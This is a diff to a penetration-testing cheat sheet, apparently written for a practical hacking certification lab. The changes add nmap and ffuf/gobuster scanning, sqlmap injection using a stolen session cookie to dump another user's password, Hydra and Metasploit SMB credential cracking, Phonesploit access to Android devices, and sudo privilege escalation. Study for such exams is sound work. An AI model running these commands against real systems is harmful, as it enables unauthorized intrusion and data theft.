@@ -1,5 +1,6 @@
 # Quick Start
 ```
+https://anotepad.com/notes/yxsin32n
 >netdiscover -r {any target}/24
 >nmap -sn {any target}/24
 >nmap -Pn -sS -A -oA nmap.xml 10.10.1.1/24 -vv && xsltproc nmap.xml -o nmap.html
@@ -299,7 +300,7 @@ On Attacker
 >ssh {user}@{targetIP}
 Password from shoulder surfing, previous challenege, or hydra
 >whoami
->sudo -l (look for NOPASSWD
+>sudo -l (look for NOPASSWD)
 >sudo -u {user2} {command} (e.g. >sudo -u user2 /bin/bash)
 >whoami
 >cat flag file
@@ -911,8 +912,11 @@ Get password
 
 # SQLMAP
 ```
+Check for robots.txt
 Fuzz the server for pages
 >ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.143.169/FUZZ -mc all -c -fc 404 -e .php,.html,.txt
+>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -u http://10.10.10.10
+>
 Once found find a page with SQL query
 Intercept request in Burp and copy to file (sqlmap-request.txt)
 >sqlmap -r sqlmap-request.txt --dbs
@@ -1002,12 +1006,18 @@ Find the FQDN of the domain controller in the network.
 
 ## Example Scenario #3
 Identify the machine with smb enabled. Crack the smb credentials for the username given. Access an encrypted file and decode the encrypted file to retrieve the flag.
+Check hydra-sheet
 - **Tips:** Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot os. Use Hydra to crack it. You can also use Metasploit to crack the password. Use Msfconsole auxiliary/scanner/smb/smb_login. The password for the encoded file is the same. If the file contains a hash, try to decode it.
 - **Things to google:** smb enumeration, FTP Exploitation.
 
 ## Example Scenario #4
 There is an Android device in the subnet. Identify the device. Get the files in scan folder. Provide SHA384 hash with the largest of entropy.
 - **Tips:** Scan the entire subnet to identify android device. Use Phonesploit, pull required folder to download files, check the entropy of all files (Detect it easy tool), and then calculate hash. (hashcalc)
+- https://codebeautify.org/sha384-hash-generator
+  OR
+- https://hash.online-convert.com/sha384-generator
+- https://products.aspose.app/pdf/hash-generator/sha384
+- https://emn178.github.io/online-tools/sha384_file_hash.html
 - **Things to google:** Hacking Android Devices with Phonesploit over ADB, Analyze ELF Executable File using Detect It Easy (DIE), Calculating Hashes on Windows with different tools
 
 ## Example Scenario #5
@@ -1051,8 +1061,8 @@ From a pcap file, analyze a DDOS attack and provide the IP address that sent mos
 
 ## Example Scenario #12
 You are provided a username/password for a website. Use SQL Injection attack to extract the password of another user.
-- **Tips:** Log in with the given credential. Use cookie to extract the password of a user from the table with sqlmap.
-  - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" --dbs`    #for Database
+- **Tips:** Log in with the given credential. Go to profile page note the full url. In developer tools go to Console and type document.cookie Use cookie to extract the password of a user from the table with sqlmap.
+  - `$ sqlmap -u "URL of profile page" --cookie="captured cookie of logged in user" --dbs`    #for Database
   - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" -D *DATABASE NAME* --tables` #for Tables of selected Database
   - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" -D *DATABASE NAME* -T *TABLE NAME* --columns` #for Column names
   - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump` #dump the table
@@ -1060,6 +1070,11 @@ You are provided a username/password for a website. Use SQL Injection attack to 
 
 ## Example Scenario #13
 Exploit a web application at www.xxxx.com and enter the flag value from a given page.
+Find a login page, or owasp zap 
+Check for robots.txt
+Fuzz the server for pages
+>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.143.169/FUZZ -mc all -c -fc 404 -e .php,.html,.txt
+>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -u http://10.10.10.10
 - **Tips:** Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap
   - `sqlmap -r <txt file from burpsuite> -D <database name> --tables`
   - `sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns`
@@ -1068,7 +1083,7 @@ Exploit a web application at www.xxxx.com and enter the flag value from a given 
 - **Things to google:** SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)
 
 ## Example Scenario #14
-Perform vulnerability research and exploit the target at a given site.
+Perform vulnerability research and exploit the target at a given site. Looks for file upload functionality.
 - **Tips:** Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/File inclusion vulnerability on DVWA.
 - **Things to google:** DVWA file upload, File Inclusion
 
